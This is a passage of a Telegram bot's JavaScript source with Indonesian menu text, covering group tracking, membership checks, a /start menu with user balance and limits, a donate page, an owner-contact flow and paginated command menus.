    } catch (error) { console.error(chalk.red(`❌ Auto save error: ${error.message}`)); }
});

bot.on('left_chat_member', async (ctx) => {
    try {
        const botId = ctx.botInfo.id;
        if (ctx.message.left_chat_member.id === botId && ctx.chat.type !== 'private') {
            const groupId = ctx.chat.id.toString();
            let groups = [];
            if (fs.existsSync(fileGroup)) { try { groups = JSON.parse(fs.readFileSync(fileGroup, 'utf8')); } catch (e) { groups = []; } }
            groups = groups.filter(id => id !== groupId);
            fs.writeFileSync(fileGroup, JSON.stringify(groups));
            console.log(chalk.yellow(`📤 Bot dikeluarkan dari grup: ${groupId}`));
            console.log(chalk.blue(`📊 Total grup: ${groups.length}`));
        }
    } catch (error) { console.error(chalk.red(`❌ Auto remove error: ${error.message}`)); }
});

// --------------------------------------------------------------------------
// [ START COMMAND ]
// --------------------------------------------------------------------------
bot.start(async (ctx) => {
    try {
        const username = ctx.from.username || ctx.from.first_name || 'User';
        const userId = ctx.from.id.toString();
        const chatType = ctx.chat.type;
        try {
            addUserToDatabase(
                userId,
                ctx.from.username,
                ctx.from.first_name,
                ctx.from.last_name, 
                ctx
            );
        } catch (error) {
            console.error("[ERROR] Gagal tambah user ke database:", error.message);
        }
     
        let isMember = true;
        let missingJoins = [];
        
        if (config.Join_Channel && !config.disableChannelCheck) {
            try {
                const isChannelMember = await checkChannel(userId);
                if (!isChannelMember) {
                    isMember = false;
                    missingJoins.push('channel');
                }
            } catch (error) {
                console.error("[ERROR] Error check channel:", error.message);
            }
        }
        
        if (config.Join_Grup && !config.disableGroupCheck) {
            try {
                const isGroupMember = await checkGroup(userId);
                if (!isGroupMember) {
                    isMember = false;
                    missingJoins.push('group');
                }
            } catch (error) {
                console.error("[ERROR] Error check group:", error.message);
            }
        }
        
        if (!isMember) {
            let message = 
`<blockquote>👋 <b>𝖲𝖾𝗅𝖺𝗆𝖺𝗍 𝖣𝖺𝗍𝖺𝗇𝗀 𝖣𝗂 ${config.Botname || 'Vyxxz'}</b></blockquote>
𝖡𝗈𝗍 𝖨𝗇𝗂 𝖲𝗂𝖺𝗉 𝖬𝖾𝗆𝖻𝖺𝗇𝗍𝗎 𝗄𝖺𝗆𝗎 𝖣𝖾𝗇𝗀𝖺𝗇 𝖥𝗂𝗍𝗎𝗋 𝖸𝖺𝗇𝗀 𝗍𝖾𝗋𝗌𝖾𝖽𝗂𝖺

<blockquote><b>𝖣𝖾𝗇𝗀𝖺𝗇 𝗃𝗈𝗂𝗇 𝗄𝗈𝗆𝗎𝗇𝗂𝗍𝖺𝗌, 𝗄𝖺𝗆𝗎 𝖻𝖺𝗄𝖺𝗅 𝖽𝖺𝗉𝖺𝗍:</b></blockquote>`;

            if (missingJoins.includes('channel')) {
                message += `\n✅ Update fitur terbaru`;
                message += `\n✅ Info & pengumuman penting`;
            }
            
            if (missingJoins.includes('group')) {
                message += `\n✅ Bantuan penggunaan bot`;
                message += `\n✅ Diskusi & sharing`;
            }
            
            message += `\n\n<blockquote>👇 <b>𝖪𝗅𝗂𝗄 𝖳𝗈𝗆𝖻𝗈𝗅 𝖩𝗈𝗂𝗇 𝖣𝗂 𝖠𝗍𝖺𝗌</b></blockquote>
𝖫𝖺𝗅𝗎 𝖪𝖾𝗍𝗂𝗄 /start 𝖫𝖺𝗀𝗂 🚀`;

            const buttons = [];
            if (missingJoins.includes('channel')) {
                buttons.push([{ text: "📢 𝖩𝗈𝗂𝗇 𝖢𝗁𝖺𝗇𝗇𝖾𝗅", url: config.Join_Channel }]);
            }
            
            if (missingJoins.includes('group')) {
                buttons.push([{ text: "📢 𝖩𝗈𝗂𝗇 𝖦𝗋𝗎𝗉", url: config.Join_Grup }]);
            }

            return ctx.reply(message, {
                parse_mode: "HTML",
                reply_markup: { inline_keyboard: buttons }
            });
        }

        const progressStages = [
            { bar: "▰▱▱▱▱▱▱▱▱ 10%", delay: 100 },
            { bar: "▰▰▱▱▱▱▱▱▱ 30%", delay: 200 },
            { bar: "▰▰▰▱▱▱▱▱▱ 40%", delay: 100 },
            { bar: "▰▰▰▰▱▱▱▱▱ 50%", delay: 200 },
            { bar: "▰▰▰▰▰▱▱▱▱ 60%", delay: 100 },
            { bar: "▰▰▰▰▰▰▱▱▱ 70%", delay: 200 },
            { bar: "▰▰▰▰▰▰▰▱▱ 80%", delay: 100 },
            { bar: "▰▰▰▰▰▰▰▰▱ 90%", delay: 200 },
            { bar: "▰▰▰▰▰▰▰▰▰ 100%\n✅", delay: 100 }
        ];

        let loadingMessage = await ctx.reply(`<blockquote><b>─ 𝖫𝗈𝗎𝖽𝗂𝗇𝗀𝗌 𝖲𝗒𝗌𝗍𝖾𝗆</b></blockquote>\n⏳ Memuat sistem...\n${progressStages[0].bar}`, {
            parse_mode: "HTML"
        });

        for (let i = 1; i < progressStages.length; i++) {
            await sleep(progressStages[i].delay);
            try {
                await ctx.telegram.editMessageText(
                    ctx.chat.id,
                    loadingMessage.message_id,
                    undefined,
                    `<blockquote><b>─ 𝖫𝗈𝗎𝖽𝗂𝗇𝗀𝗌 𝖲𝗒𝗌𝗍𝖾𝗆</b></blockquote>\n⏳ Memuat sistem...\n${progressStages[i].bar}`,
                    { parse_mode: "HTML" }
                );
            } catch (error) {
                console.error("[ERROR] Gagal update pesan loading:", error.message);
            }
        }

        try {
            await ctx.telegram.deleteMessage(ctx.chat.id, loadingMessage.message_id);
        } catch (error) {
            console.error("[ERROR] Gagal hapus pesan loading:", error.message);
        }

        const userLimit = getUserLimit(userId);
        const isUserPremium = isPremium ? isPremium(userId) : false;
        const premiumStatus = isUserPremium ? "✅ Premium" : "💸 Free User";
        const ram = getRamInfo ? getRamInfo() : { used: "0 MB", total: "0 MB" };
        const runtime = getBotRuntime ? getBotRuntime() : "0h 0m";
        
        let totalGroups = 0;
        try {
            const fileGroup = "./FileData/database/groups.json";
            if (fs.existsSync(fileGroup)) {
                const data = fs.readFileSync(fileGroup, 'utf8');
                const groups = JSON.parse(data);
                totalGroups = groups.length;
            }
        } catch (error) {
            console.error("[ERROR] Error reading groups:", error.message);
        }
        
        const totalUsers = getTotalUsers ? getTotalUsers() : 0;
        const totalFitur = hitungTotalFitur ? hitungTotalFitur() : 0;

        // Keyboard menu
        const keyboard = [
            [
                { text: "All Menu", callback_data: "AllMenu" }
            ], 
            [
                { text: "Menu Services", callback_data: "Order" }, 
                { text: "Owner Access", callback_data: "OwnMenu" }
            ],
            [
                { text: "-# 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 !", callback_data: "menu_owner_contact" }
            ]
        ];

        // Di bagian /start, update caption-nya:

const caption = `
<blockquote><b>─ 𝖡𝗈𝗍 Ϟ Info</b></blockquote>
<b>𝖠𝗎𝗍𝗁𝗈𝗋:</b> ${config.NameOwner}
<b>𝖵𝖾𝗋𝗌𝗂𝗈𝗇:</b> ${config.Version}
<b>𝖯𝗋𝖾𝖿𝗂𝗑:</b> / (slash)
<b>𝖱𝗎𝗇𝗍𝗂𝗆𝖾:</b> ${runtime}
<b>𝖳𝗈𝗍𝖺𝗅 𝖢𝗈𝗆𝗆𝖺𝗇𝖽:</b> ${formatNumber(totalFitur)}
<b>𝖴𝗌𝖾𝗋:</b> ${formatNumber(totalUsers)} 
<b>𝖭𝗈𝖽𝖾.Js:</b> ${process.version}

<blockquote><b>─ User Ϟ Info</b></blockquote>
<b>Username:</b> ${username}
<b>ID:</b> <code>${userId}</code>
<b>Status:</b> ${premiumStatus}
<b>𝖲𝖺𝗅𝖽𝗈:</b> Rp ${getUserSaldo(userId).toLocaleString('id-ID')}
<b>𝖫𝗂𝗆𝗂𝗍:</b> ${getUserLimit(userId).remaining}/${getUserLimit(userId).dailyLimit}`; 

        try {
            if (config.menuEffects && ctx.chat?.type === "private") {
                try {
                    const effectId = Array.isArray(config.menuEffects) ? 
                        config.menuEffects[Math.floor(Math.random() * config.menuEffects.length)] : 
                        config.menuEffects;
                    
                    await ctx.replyWithPhoto(menuimage(), {
                        caption: caption,
                        parse_mode: 'HTML',
                        reply_markup: { inline_keyboard: keyboard },
                        message_effect_id: effectId 
                    });
                } catch (error) {
                    console.error("[ERROR] Menu dengan efek gagal:", error.message);
                    await ctx.replyWithPhoto(menuimage(), {
                        caption: caption,
                        parse_mode: 'HTML',
                        reply_markup: { inline_keyboard: keyboard }
                    });
                }
            } else {
                await ctx.replyWithPhoto(menuimage(), {
                    caption: caption,
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: keyboard }
                });
            }

        } catch (error) {
            console.error("[ERROR] Error sending menu:", error.message);
        }

    } catch (error) {
        console.error("[ERROR] Fatal error in /start:", error);
        await ctx.reply("Terjadi kesalahan. Silakan coba lagi nanti.");
    }
});

bot.action("BackToMenu", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || 'User';
  const userId = ctx.from.id.toString();
  const chatType = ctx.chat.type;
  
  const userLimit = getUserLimit(userId);
  const isUserPremium = isPremium ? isPremium(userId) : false;
  const premiumStatus = isUserPremium ? "✅ Premium" : "💸 Free User";
  const ram = getRamInfo ? getRamInfo() : { used: "0 MB", total: "0 MB" };
  const runtime = getBotRuntime ? getBotRuntime() : "0h 0m";
        
  let totalGroups = 0;
    try {
        const fileGroup = "./FileData/database/groups.json";
         if (fs.existsSync(fileGroup)) {
            const data = fs.readFileSync(fileGroup, 'utf8');
            const groups = JSON.parse(data);
            totalGroups = groups.length;
         }
    } catch (error) {
     console.error("[ERROR] Error reading groups:", error.message);
  }
        
  const totalUsers = getTotalUsers ? getTotalUsers() : 0;
  const totalFitur = hitungTotalFitur ? hitungTotalFitur() : 0;
  
  await ctx.editMessageCaption(`
<blockquote><b>— Hello ${username}!,</b></blockquote>
<b>Let me introduce myself. I am <b>Vyxxz! - BOT</b>. Created by @ReyValdz to serve your needs</b>

<blockquote><b>─ 𝖡𝗈𝗍 Ϟ Info</b></blockquote>
<b>𝖠𝗎𝗍𝗁𝗈𝗋:</b> ${config.NameOwner}
<b>𝖵𝖾𝗋𝗌𝗂𝗈𝗇:</b> ${config.Version}
<b>𝖯𝗋𝖾𝖿𝗂𝗑:</b> / (slash)
<b>𝖱𝗎𝗇𝗍𝗂𝗆𝖾:</b> ${runtime}
<b>𝖳𝗈𝗍𝖺𝗅 𝖢𝗈𝗆𝗆𝖺𝗇𝖽:</b> ${formatNumber(totalFitur)}
<b>𝖴𝗌𝖾𝗋:</b> ${formatNumber(totalUsers)} 
<b>𝖭𝗈𝖽𝖾.Js:</b> ${process.version}

<blockquote><b>─ User Ϟ Info</b></blockquote>
<b>Username:</b> ${username}
<b>ID:</b> <code>${userId}</code>
<b>Status:</b> ${premiumStatus}
<b>𝖲𝖺𝗅𝖽𝗈:</b> Rp ${getUserSaldo(userId).toLocaleString('id-ID')}
<b>𝖫𝗂𝗆𝗂𝗍:</b> ${getUserLimit(userId).remaining}/${getUserLimit(userId).dailyLimit}`,
    {
      parse_mode: 'HTML',
      reply_markup: { 
        inline_keyboard: [
      [
           { text: "All Menus", callback_data: "AllMenu" },
           { text: "Cek Saldo", callback_data: "CheckSaldo"}
            ], 
            [
                { text: "Menu Services", callback_data: "Order" }, 
                { text: "Owner Access", callback_data: "OwnMenu" }
            ],
            [
                { text: "-# 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 !", callback_data: "menu_owner_contact" }
            ]
        ]
      }
    }
  );
  await ctx.answerCbQuery();
});

/// ------- Donate -------- ///
bot.action("donate", async (ctx) => {
    await ctx.editMessageMedia(
        {
            type: 'photo',
            media: 'https://files.catbox.moe/9zxhu3.jpg',
            caption: `<blockquote><b>𝖲𝗎𝗉𝗉𝗈𝗋𝗍 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝗆𝖾𝗇𝗍</b></blockquote>
<blockquote>𝖸𝗈𝗎𝗋 𝖽𝗈𝗇𝖺𝗍𝗂𝗈𝗇 𝗁𝖾𝗅𝗉𝗌 𝗎𝗌 𝗆𝖺𝗂𝗇𝗍𝖺𝗂𝗇 𝖺𝗇𝖽 𝗂𝗆𝗉𝗋𝗈𝗏𝖾 𝗍𝗁𝗂𝗌 𝖻𝗈𝗍. 𝖤𝗏𝖾𝗋𝗒 𝖼𝗈𝗇𝗍𝗋𝗂𝖻𝗎𝗍𝗂𝗈𝗇 𝗂𝗌 𝖺𝗉𝗉𝗋𝖾𝖼𝗂𝖺𝗍𝖾𝖽! ☘️</blockquote>
<blockquote><b>𝖳𝗁𝖺𝗇𝗄 𝗒𝗈𝗎 𝖿𝗈𝗋 𝗒𝗈𝗎𝗋 𝗌𝗎𝗉𝗉𝗈𝗋𝗍!</b></blockquote>`,
            parse_mode: 'HTML'
        },
        {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "Contact 𝖮𝗐𝗇𝖾𝗋", url: "https://t.me/ReyValdz" }, 
                        { text: "𝖡𝗈𝗍𝗌 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇", url: "https://t.me/Xtrol_Team" }
                    ]
                ]
            }
        }
    );
    await ctx.answerCbQuery("Thank you for considering to donate!");
});

// -------------------- [ Command : chat owner ] -------------------- \\
bot.action("menu_owner_contact", async (ctx) => {
  await editMenuMessage(ctx,
    `<blockquote><b>📞「 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗢𝗪𝗡𝗘𝗥 𝗕𝗢𝗧 」</b></blockquote>
     <b>━━━━━━━━━━━━━━━━━━━━━━❍</b>
     <b>𝖭𝖺𝗆𝖾:</b> ${config.Botname}
     <b>𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝗆:</b> ${config.NameOwner}
     <b>━━━━━━━━━━━━━━━━━━━━━━❍</b>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "💬 Send Message", callback_data: "send_message_owner", style: "success" }]
        ]
      }
    }
  );
});

bot.action("send_message_owner", async (ctx) => {
  const userId = ctx.from.id;
  Livechat.set(userId, {
    mode: 'sending_message',
    step: 'waiting_message',
    timestamp: Date.now()
  });
  
  await editMenuMessage(ctx, 
    "<blockquote>📝 <b>Send Message to Owner</b></blockquote>\n<blockquote>Please type the message you want to send to the Owner.\nPress the button below to cancel</blockquote>",
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "❌ Cancel", callback_data: "batall", style: "danger" }]
        ]
      }
    }
  );
});

bot.action("batall", async (ctx) => {
  const userId = ctx.from.id;
  
  if (Livechat.has(userId) && Livechat.get(userId).mode === 'sending_message') {
    Livechat.delete(userId);
    await editMenuMessage(
      ctx,
      '<blockquote>✅ <b>Message delivery canceled.</b></blockquote>',
      {
        reply_markup: { inline_keyboard: [] }
      }
    );
  } else {
    await editMenuMessage(
      ctx,
      '<blockquote>❌ No message delivery is in progress.</blockquote>',
      {
        reply_markup: { inline_keyboard: [] }
      }
    );
  }
});

/// ------------------------------------- ///
/// [ ALL MENU PEGES ]
/// ------------------------------------- ///
const allmenupeges = [
    {
        callback: "AllMenu",
        keyboard: [
            [
                { text: "𝖢𝗉𝖺𝗇𝖾𝗅 𝖬𝖾𝗇𝗎", callback_data: "cpanel" }
            ],
            [
                { text: "𝖩𝖺𝗌𝗁𝖾𝗋 𝖬𝖾𝗇𝗎", callback_data: "Jasher" },
                { text: "Encript 𝖬𝖾𝗇𝗎", callback_data: "Obf" }
            ],
            [
                { text: "Back To Menu", callback_data: "BackToMenu" },
                { text: "Next", callback_data: "AllMenu2" }
            ],
            [
                { text: "𝖡𝗈𝗍𝗌 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇", url: "https://t.me/Xtrol_Team" }
            ]
        ]
    },
    {
        callback: "AllMenu2",
        keyboard: [
            [
                { text: "𝖦𝗂𝗋𝗅 𝖬𝖾𝗇𝗎", callback_data: "RandomGrils" },
                { text: "𝖣𝗈𝗐𝗇𝗅𝗈𝖺𝖽 𝖬𝖾𝗇𝗎", callback_data: "Download" }
            ],
            [
                { text: "𝖳𝗈𝗈𝗅𝗌 𝖬𝖾𝗇𝗎", callback_data: "Tools" },
                { text: "𝖴𝗌𝖾𝗋 𝖬𝖾𝗇𝗎", callback_data: "User" }
            ],
            [
                { text: "Back To Menu", callback_data: "AllMenu" },
                { text: "Next", callback_data: "AllMenu3" }
            ],
            [
                { text: "𝖡𝗈𝗍𝗌 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇", url: "https://t.me/Xtrol_Team" }
            ]
        ]
    },
    {
        callback: "AllMenu3",
        keyboard: [
            [
                { text: "𝖯𝗋𝗈𝗍𝖾𝖼𝗍 𝖬𝖾𝗇𝗎", callback_data: "protect" },
                { text: "𝖨𝗇𝗌𝗍𝖺𝗅𝗅 𝖬𝖾𝗇𝗎", callback_data: "install" }
            ],
            [
                { text: "𝖢𝗏𝗉𝗌 𝖬𝖾𝗇𝗎", callback_data: "Cvps" },
                { text: "Advance Menu", callback_data: "Advance" }
            ],
            [
                { text: "Back To Menu", callback_data: "AllMenu2" },
                { text: "Next", callback_data: "AllMenu4" }
            ],
            [
                { text: "Bots Information", url: "https://t.me/Xtrol_Team" }
            ]
        ]
    },
    {
        callback: "AllMenu4",
        keyboard: [
            [
                { text: "𝖢𝖺𝗇𝗏𝖺 𝖬𝖾𝗇𝗎", callback_data: "Canva" },
                { text: "𝖦𝗋𝗎𝗉 𝖬𝖾𝗇𝗎", callback_data: "Grup" }
            ],
            [
                { text: "𝖮𝗋𝖽𝖾𝗋 𝖬𝖾𝗇𝗎", callback_data: "Order" }
            ],
            [
                { text: "Back To Menu", callback_data: "AllMenu3" },
                { text: "Next", callback_data: "AllMenu5" }
            ],
            [
                { text: "𝖡𝗈𝗍𝗌 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇", url: "https://t.me/Xtrol_Team" }
            ]
        ]
    },
    {
        callback: "AllMenu5",
        keyboard: [
            [
                { text: "𝖠𝖨 𝖬𝖾𝗇𝗎", callback_data: "Ai" },
                { text: "𝖲𝗍𝖺𝗅𝗄 𝖬𝖾𝗇𝗎", callback_data: "stalk" }
            ],
            [
                { text: "𝖡𝖾𝗋𝗂𝗍𝖺 𝖬𝖾𝗇𝗎", callback_data: "berita" },
                { text: "𝖲𝖾𝖺𝗋𝖼𝗁 𝖬𝖾𝗇𝗎", callback_data: "Search" }
            ],
            [
                { text: "Back To Menu", callback_data: "AllMenu4" },
                { text: "Next", callback_data: "AllMenu6" }
            ],
            [
                { text: "𝖡𝗈𝗍𝗌 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇", url: "https://t.me/Xtrol_Team" }
            ]
        ]
    },
    {
        callback: "AllMenu6",
        keyboard: [
            [
                { text: "𝖦𝖺𝗆𝖾 𝖬𝖾𝗇𝗎", callback_data: "Game" }
            ],
            [
                { text: "Back To Menu", callback_data: "AllMenu5" },
                { text: "𝖡𝗈𝗍𝗌 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇", url: "https://t.me/Xtrol_Team" }
            ]
        ]
    }
];

/// ----- all menu pege ------ ///
allmenupeges.forEach(page => {
    bot.action(page.callback, async (ctx) => {
        try {
            const username = ctx.from.username || ctx.from.first_name || 'User';
            
            await editMenuMessageWithPhoto(
                ctx,
                menuimage(),
                `<blockquote><b>📌 𝖣𝖺𝖿𝗍𝖺𝗋 𝖬𝖾𝗇𝗎</b></blockquote>
<b>𝖯𝗂𝗅𝗂𝗁 𝗄𝖺𝗍𝖾𝗀𝗈𝗋𝗂 𝖽𝗂 𝖻𝖺𝗐𝖺𝗁 𝗎𝗇𝗍𝗎𝗄 𝗆𝖾𝗅𝗂𝗁𝖺𝗍 𝖼𝗈𝗆𝗆𝖺𝗇𝖽:</b>`,
                { reply_markup: { inline_keyboard: page.keyboard } }
            );
        } catch (error) {
            console.error(`Error in ${page.callback}:`, error.message);
        }
    });
});

/// ------ Simple Handler ------ ///
const createSimpleMenuHandler = (callbackData, title, commands) => {
    bot.action(callbackData, async (ctx) => {
        const username = ctx.from.username || ctx.from.first_name || 'User';

        const keyboard = [
            [
                { text: "Back To Menu", callback_data: "BackToMenu" }
            ],
            [
                { text: "Contact Owner", url: "https://t.me/ReyValdz" },
                { text: "Bots Information", url: "https://t.me/Xtrol_Team" }
            ]
        ];

        await editMenuMessageWithPhoto(
            ctx,
            menuimage(),
            `
<blockquote>⏤ Bots Information</blockquote>
<b>𝖮𝗐𝗇𝖾𝗋</b> ${config.NameOwner}
<b>𝖡𝗈𝗍 𝖭𝖺𝗆𝖾</b> ${config.Botname}
<b>Version 𝖡𝗈𝗍𝗌</b> ${config.Version}
<b>𝖲𝗍𝖺𝗍𝗎𝗌</b> 𝖮𝗇𝗅𝗂𝗇𝖾
<b>𝖥𝗋𝖺𝗆𝖾𝗐𝗈𝗋𝗄</b> 𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝖿.𝖩𝗌

<blockquote><b>𝖢𝗈𝗆𝗆𝖺𝗇𝖽 ${title}</b></blockquote>
${commands}

<blockquote><b>© Powered By @ReyValdz</b></blockquote>`,
            { reply_markup: { inline_keyboard: keyboard } }
        );
    });
};

bot.action("OwnMenu", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';

    const keyboard = [
        [
            { text: "𝖠𝖼𝖼𝖾𝗌𝗌 𝖬𝖾𝗇𝗎", callback_data: "AccessMenu" },
            { text: "Back To Menu", callback_data: "BackToMenu" }
        ],
        [
            { text: "Contact Owner", url: "https://t.me/ReyValdz" },
            { text: "Bots Information", url: "https://t.me/Xtrol_Team" }
        ]
    ];

    await editMenuMessageWithPhoto(
        ctx,
        menuimage(),
        `
<blockquote>⏤ Bots Information</blockquote>
<b>𝖮𝗐𝗇𝖾𝗋</b> » ${config.NameOwner}
<b>𝖡𝗈𝗍 𝖭𝖺𝗆𝖾</b> » ${config.Botname}
<b>Version 𝖡𝗈𝗍𝗌</b> » ${config.Version}
<b>𝖲𝗍𝖺𝗍𝗎𝗌</b> » 𝖮𝗇𝗅𝗂𝗇𝖾
<b>𝖥𝗋𝖺𝗆𝖾𝗐𝗈𝗋𝗄</b> » 𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝖿.𝖩𝗌

<blockquote>⏤ Bots Access</blockquote>
<b>-# /addpt » 𝖠𝖽𝖽𝖾𝖽 partner 𝖠𝖼𝖼𝖾𝗌𝗌</b>
<b>-# /delpt » 𝖣𝖾𝗅 partner 𝖠𝖼𝖼𝖾𝗌𝗌</b>
<b>-# /listpt » List partner 𝖠𝖼𝖼𝖾𝗌𝗌</b>
<b>-# /addadmin » 𝖠𝖽𝖽𝖾𝖽 𝖠𝖽𝗆𝗂𝗇 𝖠𝖼𝖼𝖾𝗌𝗌</b>
<b>-# /deladmin » 𝖣𝖾𝗅𝖾𝗍𝖾 𝖠𝖼𝖼𝖾𝗌𝗌 𝖺𝖽𝗆𝗂𝗇</b>
<b>-# /listadmin » list admin 𝖠𝖼𝖼𝖾𝗌𝗌</b>

<blockquote>⏤ Panel Access</blockquote>
<b>-# /addprem » 𝖠𝖽𝖽𝖾𝖽 𝖯𝗋𝖾𝗆 𝖠𝖼𝖼𝖾𝗌𝗌</b>
<b>-# /delprem » 𝖣𝖾𝗅 𝖯𝗋𝖾𝗆 𝖠𝖼𝖼𝖾𝗌𝗌</b>
<b>-# /listprem » List 𝖯𝗋𝖾𝗆 𝖠𝖼𝖼𝖾𝗌𝗌</b>

<blockquote><b>© Powered By @ReyValdz</b></blockquote>`,
        { reply_markup: { inline_keyboard: keyboard } }
    );
});

bot.action("AccessMenu", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';

    const keyboard = [
        [
            { text: "⬅️ 𝖯𝗋𝗂𝗏", callback_data: "OwnMenu" },
            { text: "Back To Menu", callback_data: "BackToMenu" }
        ],
        [
            { text: "Contact Owner", url: "https://t.me/ReyValdz" },
            { text: "Bots Information", url: "https://t.me/Xtrol_Team" }
        ]
    ];

    await editMenuMessageWithPhoto(
        ctx,
        menuimage(),
        `<blockquote>⏤ Bots Information</blockquote>
<b>𝖮𝗐𝗇𝖾𝗋</b> » ${config.NameOwner}
<b>𝖡𝗈𝗍 𝖭𝖺𝗆𝖾</b> » ${config.Botname}
<b>Version 𝖡𝗈𝗍𝗌</b> » ${config.Version}
<b>𝖲𝗍𝖺𝗍𝗎𝗌</b> » 𝖮𝗇𝗅𝗂𝗇𝖾
<b>𝖥𝗋𝖺𝗆𝖾𝗐𝗈𝗋𝗄</b> » 𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝖿.𝖩𝗌

<blockquote>⏤ 𝖢𝗈𝗆𝗆𝖺𝗇𝖽 Accses</blockquote>
<b>-# /grouponly » 𝗈𝗇/𝗈𝖿𝖿</b>
<b>-# /broadcast »</b>
<b>-# /backup » Backup Script</b>
<b>-# /setlimit » Settings Limit All</b>
<b>-# /addlimit » Added Limit Users</b>
<b>-# /clearsvroff » Clear Srv Offline</b>
<b>-# /listsrvoff » 𝖫𝗂𝗌𝗍 𝖲𝗋𝗏 𝖮𝖿𝖿𝗅𝗂𝗇𝖾</b>
<b>-# /delsrvoff » Delete Srv Offline</b>
<b>-# /addsender » 𝖠𝖽𝖽𝖾𝖽 𝖲𝖾𝗇𝖽𝖾𝗋</b>
<b>-# /delsender » 𝖣𝖾𝗅𝖾𝗍𝖾 𝖲𝖾𝗇𝖽𝖾𝗋</b>
<b>-# /seasons » 𝖫𝗂𝗌𝗍 𝖲𝖾𝗇𝖽𝖾𝗋</b>
<b>-# /addfile » 𝖠𝖽𝖽𝖾𝖽 𝗌𝖼𝗋𝗂𝗉𝗍</b>
<b>-# /delfile » 𝖣𝖾𝗅𝖾𝗍𝖾 𝖲𝖼𝗋𝗂𝗉𝗍</b>
<b>-# /cekpanel » 𝖢𝖾𝗄 𝖲𝗍𝖺𝗍𝗎𝗌 𝗉𝖺𝗇𝖾𝗅</b>
<b>-# /addsaldo » Add Saldo</b>

<blockquote><b>© Powered By @ReyValdz</b></blockquote>`,
        { reply_markup: { inline_keyboard: keyboard } }
    );
});

bot.action("cpanel", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';

    const keyboard = [
        [
            { text: "Cpanel V2", callback_data: "a_V2" },
            { text: "Cpanel V3", callback_data: "a_V3" }
        ],
        [
            { text: "Cpanel V4", callback_data: "a_V4" },
            { text: "Cpanel V5", callback_data: "a_V5" }
        ],
        [
            { text: "Back To Menu", callback_data: "BackToMenu" }
        ]
    ];

    await editMenuMessageWithPhoto(
        ctx,
        menuimage(),
        `<blockquote>⏤ Bots Information</blockquote>
<b>𝖮𝗐𝗇𝖾𝗋</b> » ${config.NameOwner}
<b>𝖡𝗈𝗍 𝖭𝖺𝗆𝖾</b> » ${config.Botname}
<b>Version 𝖡𝗈𝗍𝗌</b> » ${config.Version}
<b>𝖲𝗍𝖺𝗍𝗎𝗌</b> » 𝖮𝗇𝗅𝗂𝗇𝖾
<b>𝖥𝗋𝖺𝗆𝖾𝗐𝗈𝗋𝗄</b> » 𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝖿.𝖩𝗌

<blockquote><b>⏤ 𝖢𝗈𝗆𝗆𝖺𝗇𝖽 𝖢𝗉𝖺𝗇𝖾𝗅 𝖵𝟣</b></blockquote>
<b>-# /cpanel » 𝖢𝗋𝖾𝖺𝗍𝖾 𝖯𝖺𝗇𝖾𝗅 𝖲𝗋𝗏</b>
<b>-# /cadmin » 𝖢𝗋𝖾𝖺𝗍𝖾 𝖠𝖽𝗆𝗂𝗇 𝖲𝗋𝗏</b>
<b>-# /deladminp » 𝖣𝖾𝗅𝖾𝗍𝖾 𝖠𝖽𝗆𝗂𝗇 𝖲𝗋𝗏</b>
<b>-# /delpanel » 𝖣𝖾𝗅𝖾𝗍𝖾 𝖯𝖺𝗇𝖾𝗅 𝖲𝗋𝗏</b>
<b>-# /deluser » 𝖣𝖾𝗅𝖾𝗍𝖾 𝖴𝗌𝖾𝗋 𝖲𝗋𝗏</b>

<blockquote><b>© Powered By @ReyValdz</b></blockquote>`,
        { reply_markup: { inline_keyboard: keyboard } }
    );
});

/// ---- Cpanel Next ---- ///
const cpanelVersions = [
    {
        callback: "a_V2",
        title: "𝖢𝗉𝖺𝗇𝖾𝗅 𝖵2",
        commands: `<b>-# /cpanelV2 » 𝖢𝗋𝖾𝖺𝗍𝖾 𝖯𝖺𝗇𝖾𝗅 𝖲𝗋𝗏</b>
<b>-# /cadminV2 » 𝖢𝗋𝖾𝖺𝗍𝖾 𝖠𝖽𝗆𝗂𝗇 𝖲𝗋𝗏</b>
<b>-# /deladminpV2 » 𝖣𝖾𝗅𝖾𝗍𝖾 𝖠𝖽𝗆𝗂𝗇 𝖲𝗋𝗏</b>
<b>-# /delpanelV2 » 𝖣𝖾𝗅𝖾𝗍𝖾 𝖯𝖺𝗇𝖾𝗅 𝖲𝗋𝗏</b>
<b>-# /deluserV2 » 𝖣𝖾𝗅𝖾𝗍𝖾 𝖴𝗌𝖾𝗋 𝖲𝗋𝗏</b>`
    },
    {
        callback: "a_V3",
        title: "𝖢𝗉𝖺𝗇𝖾𝗅 𝖵3",
        commands: `<b>-# /cpanelV3 » 𝖢𝗋𝖾𝖺𝗍𝖾 𝖯𝖺𝗇𝖾𝗅 𝖲𝗋𝗏</b>
<b>-# /cadminV3 » 𝖢𝗋𝖾𝖺𝗍𝖾 𝖠𝖽𝗆𝗂𝗇 𝖲𝗋𝗏</b>
<b>-# /deladminpV3 » 𝖣𝖾𝗅𝖾𝗍𝖾 𝖠𝖽𝗆𝗂𝗇 𝖲𝗋𝗏</b>
